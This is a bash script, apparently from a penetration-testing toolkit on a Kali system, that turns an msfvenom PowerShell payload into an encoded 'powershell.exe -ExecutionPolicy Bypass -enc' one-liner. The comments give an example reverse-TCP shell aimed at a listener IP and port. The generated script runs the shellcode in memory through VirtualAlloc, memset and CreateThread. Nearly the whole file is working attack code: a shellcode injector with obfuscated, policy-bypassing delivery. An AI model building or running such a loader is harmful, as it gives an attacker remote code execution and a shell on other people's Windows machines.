#!/bin/bash
# You need to generate an MSFVenom payload in ps1 format to be an input into this command. Note the variable (-v) should be 'sc'.
# Example 
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.150 LPORT=9001 -f ps1 -v sc -o shell_9001.ps1
# Enc_Power_Shell_Shellcode_Exec shell_9001.ps1
if [ $# -eq 0 ]; then
    echo "Usage: Enc_Power_Shell_Shellcode_Exec [shellcode file]"
    exit 1
fi

cat << "EOF" > PS_shellcode_injection.ps1
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

$winFunc = Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;

[Byte[]];
EOF
cat $1 >> PS_shellcode_injection.ps1
cat << "EOF" >> PS_shellcode_injection.ps1
;

$size = 0x1000;

if ($sc.Length -gt 0x1000) {$size = $sc.Length};

$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};

$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
EOF

Encoded_String=$( python /home/kali/Ops/Tools/py_encoder.py -s PS_shellcode_injection.ps1 );
echo "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -enc $Encoded_String";
echo "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -enc $Encoded_String" | clip;
